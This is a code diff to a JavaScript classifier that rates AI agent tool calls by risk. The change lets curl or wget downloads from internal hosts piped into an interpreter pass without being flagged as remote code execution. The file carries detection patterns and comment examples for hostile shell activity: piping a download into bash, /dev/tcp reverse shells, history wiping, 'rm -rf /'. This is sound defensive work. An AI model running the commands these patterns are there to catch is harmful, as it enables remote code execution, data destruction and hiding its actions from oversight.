@@ -1,5 +1,5 @@
 // Risk classification for agent tool-calls. Deterministic, offline, fast.
-import { safeStringify } from './scan.mjs';
+import { safeStringify, URL_RE, isExternal } from './scan.mjs';
 export const TIER = { GREEN: 'green', YELLOW: 'yellow', RED: 'red', BLACK: 'black' };
 export const ORDER = { green: 0, yellow: 1, red: 2, black: 3 };
 export const worst = (a, b) => (ORDER[a] >= ORDER[b] ? a : b);
@@ -16,6 +16,19 @@ export const READONLY = ['read', 'get', 'list', 'ls', 'grep', 'glob', 'status', 
 // as a mere argument, so `curl x | grep bash` and `curl x | jq .` stay clean.
 const PIPE_INTERP = /\b(curl|wget)\b[^;\n]*\|\s*(?:(?:sudo|doas|run0|env|exec|nohup|setsid|nice|ionice|stdbuf|time|timeout|xargs|command|builtin|busybox)(?:\s+\S+){0,3}\s+){0,4}["'\\]*(?:\/[\w.\-\/]*\/)?["'\\]*(?:(?:(?:ba)?sh|zsh|dash|ash|ksh|python[0-9.]*|node|ruby|perl|php|source)\b|\.(?=\s))/i;
 
+// Gate for PIPE_INTERP: the RCE risk is executing UNTRUSTED REMOTE code. Piping a
+// download from localhost / an internal host into an interpreter is trusted-local
+// (parsing a local API response, deploying from an internal mirror) — not remote
+// code execution. So only treat it as RCE when a curl/wget http(s) target is
+// EXTERNAL. URL_RE matches only scheme'd URLs, so a trailing `# localhost` comment
+// can't fake-exempt a real external URL; with no parseable http(s) target we stay
+// conservative (block). Runs on the RAW command so a quoted URL is still seen.
+function pipeDownloadIsExternal(cmd) {
+  const hosts = [...String(cmd).matchAll(URL_RE)].map((m) => m[1]);
+  if (!hosts.length) return true;            // no parseable http(s) target → conservative
+  return hosts.some((h) => isExternal(h));   // any external scheme'd target → real RCE
+}
+
 export const BLACK_SHELL = [
   // bounded quantifiers (no adjacent `[a-z]*r[a-z]*`, no unbounded lazy gap) so a
   // long flag run like `rm -rrr…` can't trigger quadratic backtracking (ReDoS):
@@ -27,7 +40,7 @@ export const BLACK_SHELL = [
   // [^;\n]* (not [^|]*) so a download piped THROUGH filters (tee/gunzip/sed/xxd/
   // tac/rev) into an interpreter — `curl evil | tee x | bash` — is still caught,
   // staying within one pipeline (no ; to a separate command).
-  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)' },
+  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: pipeDownloadIsExternal },
   { re: /\bchmod\s+-R\s+0?777\s+\//i, why: 'world-writable root' },
   { re: /\bhistory\s+-c\b|\bunset\s+HISTFILE\b|rm\s+[^|]*\.bash_history/i, why: 'covering tracks (history wipe)' },
   { re: /\/dev\/tcp\//i, why: 'reverse shell (/dev/tcp)' },
@@ -232,7 +245,7 @@ export function classify(action) {
     // Only for genuine string commands — a stringified object/array payload must
     // be matched whole (its dangerous content is the attack, not "data").
     const mcmd = typeof cmdField === 'string' ? neutralizeQuotedData(cmd) : cmd;
-    for (const p of BLACK_SHELL) if (p.re.test(mcmd)) { tier = worst(tier, TIER.BLACK); why.push('☠ ' + p.why); }
+    for (const p of BLACK_SHELL) if (p.re.test(mcmd) && (!p.gate || p.gate(cmd))) { tier = worst(tier, TIER.BLACK); why.push('☠ ' + p.why); }
     for (const p of RED_SHELL) if (p.re.test(mcmd)) { tier = worst(tier, TIER.RED); why.push('⚠ ' + p.why); }
     for (const p of YELLOW_SHELL) if (p.re.test(mcmd)) { tier = worst(tier, TIER.YELLOW); why.push('· ' + p.why); }
     // a shell executor RUNS its quoted body — `bash -c "rm -rf /"`, `eval "…"` —
